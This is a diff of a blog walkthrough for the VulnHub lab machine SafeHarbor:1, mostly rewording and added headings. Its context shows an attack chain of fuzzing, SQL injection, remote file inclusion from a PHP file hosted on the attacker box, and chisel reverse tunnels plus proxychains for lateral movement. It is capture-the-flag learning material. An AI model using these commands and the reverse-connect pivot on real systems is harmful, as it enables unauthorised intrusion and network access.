@@ -3,7 +3,7 @@ title: VulnHub Walkthrough SafeHarbor:1
 published: true
 ---
 
-I enjoyed playing this challenge and I thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use non-traditional paths to some extent. I limited myself from using Metasploit or Cobalt Strike, which are often easily detected during red team engagements. So the goal was to use tools and scripts, that I often bookmarked and read about.
+I enjoyed playing this challenge and I thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use some non-traditional ways. I limited myself from using Metasploit for the most part, which is often easily detected during red team engagements. So the goal was to use tools and scripts, that I often use during live engagements.
 
 If you want to play along, you can download the VM from Vulnhub here: [SafeHarbor:1](https://www.vulnhub.com/entry/safeharbor-1,377/)
 
@@ -56,17 +56,19 @@ Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
 
 ```
 
-Scanning well known ports gives me something to start with, the attack surface is limited to port 80 running a PHP application and SSH service. Let's go ahead and take a look at the application.
+Scanning well known ports gives me something to start with, the attack surface is limited to port 80 running a PHP application and port 22 with SSH service. Let's go ahead and take a look at the application.
 
-In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster in my opinion.
+In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster IMO.
 
 ```sh
 wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ.php -t 500
 ```
 
-Sweet! it's a login page. 
+Sweet! it's the login page we saw in the screenshots.
 
 ![login_page](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.png)
+
+**SQL Injection:**
 
 Let's quickly try some SQL injections on the login form fields:
 
@@ -142,7 +144,7 @@ Requests/sec.: 81.17429
 
 ```
 
-Settings in phpinfo.php reveals that the directives for including files are enabled. Let's try LFI/RFI, if that doesn't work I can maybe exploit further using PHP streams.
+The configuration in phpinfo.php file reveals that the directives for including files are enabled. Let's try a conventional LFI/RFI attack, if that doesn't work I can maybe exploit further using PHP streams.
 
 ```
 Registered PHP Streams:  https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar
@@ -163,6 +165,8 @@ A quick test reveals that the parameter "p" uses include function: http://192.16
 
 ```
 
+**Remote File Inclusion (RFI):**
+
 Let me host a PHP file on my Kali (attacker) box to execute the command 'id' and include the remote file to see if that works. 
 
 ```php
@@ -177,7 +181,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 
 ```
 
-That worked!
+Looks like that worked!
 
 ![command_execution](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)
 
@@ -271,7 +275,7 @@ Outside  :80 |<--->                                      reverse connect)       
              |                                                                  |
 ```
 
-During real world red team engagements we are often faced with challenges like this, there is no SSH or firewall restricts all inbound connections except for web ports (80 or 443). We have to heavily rely on reverse connections, and that's why we will be using reverse pivot! The victim machine (client) will connect back (reverse) to the attacker machine (server) and then open a tunnel to route the traffic to the destination server(MySQL) and port. 
+During real world red team engagements we are often faced with challenges like this, there is no SSH or firewall restricts all inbound connections except for web ports (80 or 443). We have to heavily rely on reverse connections, and that's why we will be using reverse pivot! The victim machine (client) will connect back (reverse) to the attacker machine (server) and then open a tunnel to route the traffic to the target server (MySQL) and port. 
 
 There are quite a lot of tools that comes to my mind for such a situation. Listing them below for your reference:
 
@@ -298,16 +302,11 @@ Outside   |                                                 reverse connect to 8
           |                                                                         |
 ```
 
-``
-"R:<remote-port>:<target-localhost>:<local-port>"
-``
-
 **On the victim machine run:**
 
 ```sh
 ./chisel client 192.168.1.22:8888 R:9999:172.20.0.138:3306
 ```
-
 
 **On the (Kali) attacker machine run**
 
@@ -322,11 +321,11 @@ Now, let's go ahead and connect to MySQL and see what's in the database for us:
 ![mysql_connect](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.gif)
 
 
-I spent quite a lot of time reading the chisel manual page and when I checked the open issues for the project "reverse proxy" is a feature request. Unfortunately, the chisel client does not support socks5 server (I mean, makes sense it's a client right?)
+I spent some time reading the chisel manual page to see if I can use it as reverse proxy and when I checked the open issues for the project "reverse proxy" is a feature request. Unfortunately, the chisel client does not support socks5 server (I mean, makes sense it's a client right?)
 
 What we did earlier was reverse connect the docker container to our attacker machine and tunnel traffic for a specific port. For us to expand our attack surface and laterally move I would need a socks proxy or something similiar.
 
-Reading through the open issues, a comment from one of the user shows a complicated way of making this happen, here's the link to the page: https://github.com/jpillora/chisel/issues/101
+Reading through the open issues, a comment from one of the user shows a complicated way of making this happen, here's the link to the page: [Chisel Issues](https://github.com/jpillora/chisel/issues/101)
 
 **On the (Kali) attacker machine run:**
 
@@ -352,6 +351,8 @@ Here's the background of what we performed in the above steps.
 - chisel client [Docker container] tunnels traffic between port 18000 and socks5 proxy listening on [Docker container] 62000
 - This creates a socks5 proxy between [Kali VM] and [Docker container] R:127.0.0.1:1:14000=>127.0.0.1:18000 (R indicates remote)
 
+In a nutshell, here's the flow of traffic:
+
 ```
 [Docker container]--> reverse connect 9000:[Kali VM]:14000 <==> [Docker container] chisel-client 127.0.0.1:18000 ==> [Docker container] socks5 127.0.0.1:62000
 ```
@@ -360,14 +361,16 @@ On the Kali machine you should see the connection established:
 
 ![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_7.png)
 
-Phew! That was a bit complex but let's see if the socks proxy works. Let's check if 
+Phew! That was a bit complex but let's see if the socks proxy works.
 
 ```
 root@kali:~# netstat -antp | grep 14000
 tcp        0      0 127.0.0.1:14000         0.0.0.0:*               LISTEN      8203/./chisel_linux 
 ```
 
-Port 14000 has opened up on my Kali machine, let me add it to the proxychains configuration file to use that as my socks5 proxy. If this works, I should be able to use proxychains to continue moving laterally.
+Port 14000 has opened up on my Kali machine, let me add it to the proxychains configuration file to use that as my socks5 proxy. If this works, I will be able to use proxychains to continue moving laterally.
+
+**Note:** If you want to use Metasploit's database, you should add the last line in the proxychain configuration file to ignore proxying localhost connections.
 
 
 ```
@@ -383,6 +386,7 @@ root@kali:~# tail /etc/proxychains.conf
 socks5 127.0.0.1 14000
 localnet 127.0.0.1 000 255.255.255.255
 ```
+
 Quickly testing the socks5 proxy connectivity, let's do a curl on the target web server and a quick full TCP scan for port 80 on limited hosts.
 
 ![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.gif)
@@ -390,6 +394,7 @@ Quickly testing the socks5 proxy connectivity, let's do a curl on the target web
 Let's go ahead and run a full TCP port scan on using Metasploit with proxychains:
 
 ![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_8.png)
+
 
 ```
 Services
